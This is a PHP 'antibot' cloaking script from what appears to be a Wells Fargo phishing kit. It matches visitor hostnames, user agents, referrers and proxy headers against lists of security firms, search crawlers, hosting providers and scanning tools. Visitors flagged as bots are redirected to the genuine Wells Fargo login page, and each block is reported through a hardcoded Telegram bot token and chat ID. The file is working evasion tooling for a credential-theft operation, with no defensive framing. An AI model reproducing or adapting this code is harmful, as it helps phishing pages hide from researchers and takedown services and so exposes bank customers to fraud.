<?php
// [X] User Agent
// [X] Referrer
// [X] Proxy header
// [X] Get hostname
// [X] Check url parameters
// [ ] Check IP via api (country, proxy, vpn, etc)
// [X] Store result in session value
// [X] Redirect bots to random sites
function send_message_anti($msg){
	$bot_token = '5678132945:AAHEomeJXmWpZbSpK46oALkBC1OCFMySdVw'; // CHANGE THIS
	$chat_id = '-1001265381060'; // CHANGE THIS
	file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . $chat_id . '&text=' . $msg . '&parse_mode=HTML');
}
function block($reason){
	$random_sites = array("https://www.wellsfargo.com/", "https://connect.secure.wellsfargo.com/auth/login/present");
	$index = rand(0, count($random_sites)-1);
	$site = $random_sites[$index];
	$_SESSION["bot"] = true;

	$url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$ip = $_SERVER["REMOTE_ADDR"];
	$user_agent = $_SERVER["HTTP_USER_AGENT"];
	$device_id = md5($ip . $user_agent);
	$msg = "BOT BLOCKED\n\n| DEVICE : #$device_id\n| IP : $ip\n| USER AGENT : $user_agent\n| URL : $url\n| REASON : $reason";
	send_message_anti(urlencode($msg));

	header("Location: $site", true, 302);
	die();
}

function checkbot(){
	$ip = $_SERVER["REMOTE_ADDR"];
	$hostname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
	$user_agent = $_SERVER["HTTP_USER_AGENT"];
	if (isset($_SERVER["HTTP_REFERER"])){
		$referer = $_SERVER["HTTP_REFERER"];
	}

	$bad_hostname = array("above", "google", "softlayer", "amazon", "cyveillance", "phish", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msn", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "bitdefender", "mcafee", "antivirus", "malware", "cloudflare", "avg", "avira", "avast", "ovh.net", "security", "twitter", "scan", "scam", "virus", "clamav", "baidu", "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro", "aruba", "dyn.plus.net", "pagepeeker", "spro-net", "vultr", "colocrossing", "linode", "geosr", "drweb", "opendns", "cymru", "sl-reverse", "surriel", "hosting", "orange-labs", "speedtravel", "metauri", "apple.com", "bruuk", "syms", "oracle", "cisco", "amuri", "versanet", "veripayed", "facebook", "yandex", "bing", "safesearch", "163data", "blix.com", "zayo.com", "roamsite.com", "mbeadc7.com", "sinet.com", "hosted-by-itldc.com", "reverse-dns");

	foreach($bad_hostname as $bad){
		if (strpos(strtolower($hostname), $bad) !== false){
			block("Bad hostname ($bad)");
		}
	}

	$bad_user_agent = array("almaden", "anarchie", "aspseek", "attach", "autoemailspider", "backweb", "bandit", "batchftp", "blackwidow", "bot", "buddy", "bumblebee", "cherrypicker", "chinaclaw", "cicc", "collector", "copier", "crescent", "custo", "diibot", "disco", "demon", "wonder", "downloader", "drip", "dsurf15a", "ecatch", "easydl", "eirgrabber", "email", "emailcollector", "emailsiphon", "emailwolf", "webpictures", "extractorpro", "eyenetie", "filehound", "flashget", "frontpage", "getright", "getsmart", "getweb!", "gigabaz", "go!zilla", "go-ahead-got-it", "gotit", "grabber", "grabnet", "grafula", "grub-client", "hmview", "httpdown", "httrack", "ia_archiver", "image stripper", "image sucker", "indy library", "interget", "internetlinkagent", "internet ninja", "internetseer.com", "iria", "java", "jetcar", "joc web spider", "justview", "larbin", "leechftp", "lexibot", "lftp", "link*sleuth", "likse", "link", "linkwalker", "mag-net", "magnet", "memo", "microsoft", "midown", "mirror", "mister", "mozillaindy", "mozillanewt", "msfrontpage", "msiecrawler", "msproxy", "navroad", "nearsite", "netants", "netmechanic", "netspider", "netzip", "nicerspro", "ninja", "octopus", "openfind", "pagegrabber", "pavuk", "pcbrowser", "ping", "pingalink", "pockey", "psbot", "pump", "qrva", "realdownload", "reaper", "recorder", "reget", "scooter", "seeker", "siphon", "sitesnagger", "slysearch", "smartdownload", "snake", "spacebison", "sproose", "stripper", "sucker", "superbot", "superhttp", "surfbot", "szukacz", "takeout", "urlspiderpro", "vacuum", "voideye", "webauto", "webbandit", "webcollage", "webcopier", "webemailextrac", "webfetch", "webgo is", "webhook", "webleacher", "webminer", "webmirror", "webreaper", "websauger", "extractor", "quester", "webster", "webstripper", "webwhacker", "webzip", "wget", "whacker", "widow", "wwwoffle", "x-tractor", "webspider", "xenu", "zeuswebster", "zeus", "googlebot", "python", "okhttp", "adsbot-google-mobile-apps", "mediapartners-google", "bingbot", "yahoo", "duckduckbot", "yandexbot", "facebookbot", "netcraft", "windowspowershell", "curl", "freebsd", "msn", "pycurl", "powershell", "bing", "duckduckbot", "facebook", "safebrow", "spider", "crawl", "sitesucker", "yeti", "wap", "http://", "https://", "safesearch", "aria", "wicked", "yabrowser", ".NET CLR");

	if ($user_agent == ""){
		block("No User-Agent");
	}

	foreach($bad_user_agent as $bad){
		if (strpos(strtolower($user_agent), $bad) !== false){
			block("Bad User-Agent ($bad)");
		}
	}

	$bad_referer = array("above", "google", "softlayer", "amazon", "cyveillance", "phish", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msn", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "bitdefender", "mcafee", "antivirus", "malware", "cloudflare", "avg", "avira", "avast", "ovh.net", "security", "twitter", "scan", "scam", "virus", "clamav", "baidu", "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro", "aruba", "dyn.plus.net", "pagepeeker", "spro-net", "vultr", "colocrossing", "linode", "geosr", "drweb", "opendns", "cymru", "sl-reverse", "surriel", "hosting", "orange-labs", "speedtravel", "metauri", "apple.com", "bruuk", "syms", "oracle", "cisco", "amuri", "versanet", "veripayed", "facebook", "yandex", "bing", "safesearch");

	if (isset($referer)){
		foreach($bad_referer as $bad){
			if (strpos(strtolower($referer), $bad) !== false){
				block("Bad referer ($bad)");
			}
		}
	}

	if (isset($_SERVER["HTTP_X_FORWARDED"]) || isset($_SERVER["HTTP_FORWARDED_FOR"]) || isset($_SERVER["HTTP_CLIENT_IP"]) || isset($_SERVER["HTTP_VIA"])) {
		block("Proxy headers detected");
	}

	$valid_parameters = array("verify", "auth", "login", "id", "token", "key", "client", "prod");

	$valid_p = false;

	foreach(array_keys($_GET) as $k){
		if (in_array($k, $valid_parameters)){
			$valid_p = true;
		}
	}
	
	if (!$valid_p){
		block("Bad URL parameters");
	}

	if (basename($_SERVER["SCRIPT_NAME"]) != "index.php"){
		$script = basename($_SERVER["SCRIPT_NAME"]);
		block("Bad script name ($script)");
	}

	// https://vpnapi.io API check

	$_SESSION["bot"] = false;
}

if (isset($_SESSION["bot"])){
	if ($_SESSION["bot"]){
		block("Bot");
	}
}
else{
	checkbot();
}
?>